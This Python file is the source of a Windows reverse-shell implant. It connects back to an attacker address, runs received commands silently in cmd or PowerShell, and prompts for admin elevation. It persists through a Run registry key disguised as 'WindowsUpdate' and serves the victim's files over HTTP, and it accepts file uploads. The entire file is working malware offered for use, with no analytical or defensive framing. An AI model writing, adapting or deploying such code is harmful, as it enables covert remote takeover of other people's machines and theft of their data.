import socket
import subprocess
import os
import time
import threading
import winreg
import ctypes
import sys

ATTACKER_IP = "your attacker's IP"  # Change to your attacker's IP
PORT = 2000  # Reverse shell port
HTTP_PORT = 8080  # File transfer HTTP server port
CREATE_NO_WINDOW = 0x08000000  # To hide the subprocess window




def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def elevate_to_admin():
    """Elevate the script to run as an administrator."""
    if not is_admin():
        script = sys.argv[0]
        params = " ".join(sys.argv[1:])
        # Relaunch the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit()



def get_ip_address():
    """Get the correct IP address of the victim machine"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Connect to an external server
    ip_addr = s.getsockname()[0]  # Get assigned IP
    s.close()
    return ip_addr

def start_http_server(directory):
    """Starts an HTTP server in the given directory"""
    os.chdir(directory)
    command = f"python -m http.server {HTTP_PORT}"
    subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_unique_filename(filename):
    """Ensure the uploaded file does not overwrite existing files."""
    base, ext = os.path.splitext(filename)
    counter = 1
    while os.path.exists(filename):
        filename = f"{base}({counter}){ext}"
        counter += 1
    return filename



def receive_file(client, filename):
    """Receives a file in binary mode without corruption"""
    filename = get_unique_filename(filename)  # Ensure unique filename
    client.send(b"READY")  # Signal attacker to start sending
    with open(filename, "wb") as f:
        while True:
            chunk = client.recv(4096)
            if chunk.endswith(b"EOFEOFEOF"):  # End of File Marker
                f.write(chunk[:-9])  # Remove EOF marker before writing
                break
            f.write(chunk)
    client.send(f"File {filename} uploaded successfully.\n".encode())

def add_persistence():
    """Adds persistence by creating a registry entry."""
    exe_path = os.path.abspath(__file__)  # Get full script path
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg)
        return "[+] Persistence added successfully.\n"
    except Exception as e:
        return f"[-] Persistence failed: {e}\n"

def execute_command(command, mode="cmd"):
    """Executes a command silently in either CMD or PowerShell."""
    try:
        if mode == "powershell":
            full_command = ["powershell", "-Command", command]
        else:
            full_command = ["cmd", "/c", command]

        result = subprocess.run(
            full_command,
            capture_output=True,
            creationflags=CREATE_NO_WINDOW
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e).encode()

def connect_back():
    """Creates a reverse shell and handles commands from the attacker"""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ATTACKER_IP, PORT))

            persistence_message = add_persistence()
            shell_mode = "cmd"  # Default shell mode

            
            while True:
                cmd = client.recv(4096).decode().strip()
                if cmd.lower() == "exit":
                    break

                elif cmd.lower() == "cmd":
                    shell_mode = "cmd"
                    client.send(b"[+] Switched to CMD mode.\n")

                elif cmd.lower() == "powershell":
                    shell_mode = "powershell"
                    client.send(b"[+] Switched to PowerShell mode.\n")

                elif cmd.lower() == "help":
                    help_message = """
[+] Available Commands:
  - help                  : Show this help menu
  - persistence_status    : Check if persistence was added
  - admin_status         : Check if running with admin privileges
  - amsi_status           : Check if AMSI Bypass was successful
  - download <file>       : Download a file from victim machine
  - upload <file>         : Upload a file to victim machine
  - exit                  : Close the reverse shell
  - Any system command    : Execute system commands (e.g., dir, ls, whoami)
"""
                    client.send(help_message.encode())

                

                elif cmd.lower() == "admin_status":
                    if is_admin():
                        client.send("[+] Running with admin privileges.\n".encode())
                    else:
                        client.send("[-] Not Running with admin privileges.\n".encode())
                elif cmd.lower() == "persistence_status":
                    client.send(persistence_message.encode())
                
                elif cmd.startswith("download "):
                    filename = cmd.split(" ", 1)[1]
                    if os.path.exists(filename):
                        file_dir = os.path.dirname(os.path.abspath(filename)) or os.getcwd()
                        threading.Thread(target=start_http_server, args=(file_dir,)).start()
                        time.sleep(1)  # Wait for server to start
                        ip_addr = get_ip_address()
                        download_link = f"http://{ip_addr}:{HTTP_PORT}/{os.path.basename(filename)}"
                        client.send(f"File available at: {download_link}\n".encode())
                    else:
                        client.send("File not found.\n".encode())

                elif cmd.startswith("upload "):
                    filename = cmd.split(" ", 1)[1]
                    receive_file(client, filename)

                else:
                   output = execute_command(cmd, shell_mode)
                   client.send(output if output else b"\n")

            
            client.close()
        except:
            time.sleep(5)  # Avoid excessive reconnection attempts

if __name__ == "__main__":
    
    elevate_to_admin()

    
    

    connect_back()     
    
       
